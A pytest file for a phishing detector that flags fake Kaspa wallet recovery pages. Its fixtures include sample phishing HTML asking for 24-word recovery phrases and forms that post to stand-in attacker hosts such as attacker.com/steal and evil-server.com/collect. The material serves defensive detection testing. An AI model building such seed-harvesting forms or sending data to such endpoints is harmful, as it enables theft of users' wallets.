"""Tests for phishing detection."""

import pytest
from src.analyzer.detector import PhishingDetector
from src.analyzer.browser import BrowserResult


@pytest.fixture
def detector(tmp_path):
    """Create a phishing detector for testing."""
    return PhishingDetector(
        fingerprints_dir=tmp_path / "fingerprints",
        keywords=["recovery phrase", "seed phrase"],
        analysis_threshold=70,
    )


def make_browser_result(
    domain: str = "test.com",
    success: bool = True,
    html: str = "",
    input_fields: list = None,
    form_submissions: list = None,
    external_requests: list = None,
    title: str = "",
) -> BrowserResult:
    """Create a BrowserResult for testing."""
    return BrowserResult(
        domain=domain,
        success=success,
        html=html,
        input_fields=input_fields or [],
        form_submissions=form_submissions or [],
        external_requests=external_requests or [],
        title=title,
    )


class TestPhishingDetector:
    """Test phishing detection logic."""

    def test_failed_analysis(self, detector):
        """Failed analysis should return low verdict."""
        result = make_browser_result(success=False)
        detection = detector.detect(result)
        assert detection.verdict == "low"

    def test_seed_form_12_inputs(self, detector):
        """12 text inputs should trigger seed form detection."""
        inputs = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(12)]
        result = make_browser_result(input_fields=inputs)
        detection = detector.detect(result)
        assert detection.seed_form_detected
        assert detection.score >= 30

    def test_seed_form_24_inputs(self, detector):
        """24 text inputs should trigger seed form detection."""
        inputs = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(24)]
        result = make_browser_result(input_fields=inputs)
        detection = detector.detect(result)
        assert detection.seed_form_detected
        assert detection.score >= 30

    def test_seed_keywords_in_html(self, detector):
        """Seed-related keywords should be detected."""
        html = """
        <html>
            <body>
                <h1>Enter your recovery phrase</h1>
                <p>Please enter your 12 seed words below</p>
            </body>
        </html>
        """
        result = make_browser_result(html=html)
        detection = detector.detect(result)
        assert detection.score >= 10
        assert any("keyword" in r.lower() or "seed" in r.lower() for r in detection.reasons)

    def test_external_form_submission(self, detector):
        """Form submission to external domain should be flagged."""
        result = make_browser_result(
            domain="kaspa-wallet.xyz",
            form_submissions=[{"url": "https://evil-server.com/collect", "method": "POST", "post_data": None}],
        )
        detection = detector.detect(result)
        assert detection.score >= 30
        assert len(detection.suspicious_endpoints) > 0

    def test_suspicious_title(self, detector):
        """Suspicious page titles should add to score."""
        result = make_browser_result(title="Kaspa Wallet Recovery")
        detection = detector.detect(result)
        assert detection.score >= 15

    def test_benign_page(self, detector):
        """Benign pages should have low scores."""
        result = make_browser_result(
            html="<html><body><h1>Hello World</h1></body></html>",
            title="My Website",
        )
        detection = detector.detect(result)
        assert detection.verdict in ("low", "benign")
        assert detection.score < 30

    def test_high_confidence_phishing(self, detector):
        """Multiple signals should result in high confidence."""
        inputs = [
            {"type": "text", "name": f"word{i}", "placeholder": f"Word #{i+1}", "id": f"seed{i}"}
            for i in range(24)
        ]
        html = """
        <html>
            <body>
                <h1>Restore Your Kaspa Wallet</h1>
                <p>Enter your 24 word recovery phrase to restore access</p>
                <form action="https://attacker.com/steal">
                </form>
            </body>
        </html>
        """
        result = make_browser_result(
            domain="kaspa-restore.xyz",
            html=html,
            input_fields=inputs,
            form_submissions=[{"url": "https://attacker.com/steal", "method": "POST", "post_data": None}],
            title="Kaspa Wallet Recovery",
        )
        detection = detector.detect(result, domain_score=50)
        assert detection.verdict == "high"
        assert detection.score >= 70


class TestVerdictClassification:
    """Test verdict classification thresholds."""

    def test_high_verdict(self, detector):
        """Score >= 70 should be high."""
        result = make_browser_result()
        result.input_fields = [{"type": "text", "name": f"word{i}", "placeholder": "", "id": ""} for i in range(24)]
        result.form_submissions = [{"url": "https://evil.com/steal", "method": "POST", "post_data": None}]
        result.html = "<html><body>Enter your seed phrase recovery words</body></html>"
        detection = detector.detect(result, domain_score=50)
        assert detection.verdict == "high"

    def test_medium_verdict(self, detector):
        """Score 40-69 should be medium."""
        result = make_browser_result(
            html="<html><body>Enter your seed phrase</body></html>",
            title="Wallet Recovery",
        )
        detection = detector.detect(result, domain_score=30)
        # This might be medium depending on exact scoring
        assert detection.verdict in ("medium", "low")

    def test_low_verdict(self, detector):
        """Score 20-39 should be low."""
        result = make_browser_result(title="Kaspa Info")
        detection = detector.detect(result)
        assert detection.verdict in ("low", "benign")

    def test_benign_verdict(self, detector):
        """Score < 20 should be benign."""
        result = make_browser_result()
        detection = detector.detect(result)
        assert detection.verdict == "benign"
